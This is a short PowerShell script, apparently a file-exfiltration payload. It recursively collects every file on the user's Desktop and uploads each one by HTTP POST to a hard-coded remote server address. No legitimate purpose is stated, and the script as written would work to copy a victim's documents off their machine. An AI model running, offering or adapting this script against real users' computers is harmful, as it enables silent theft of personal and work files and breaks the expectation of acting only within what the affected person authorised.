# CONFIGURATION
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Url = "http://192.168.6.114:5000/upload"  # match server IP or domain

# Get all files recursively
$Files = Get-ChildItem -Path $DesktopPath -Recurse -File

foreach ($File in $Files) {
    try {
        $Form = @{ file = Get-Item $File.FullName }

        Write-Host "Uploading: $($File.FullName)"
        Invoke-RestMethod -Uri $Url -Method Post -Form $Form

        Write-Host "Uploaded: $($File.Name)`n"
    }
    catch {
        Write-Warning "Failed to upload: $($File.FullName). Error: $_"
    }
}
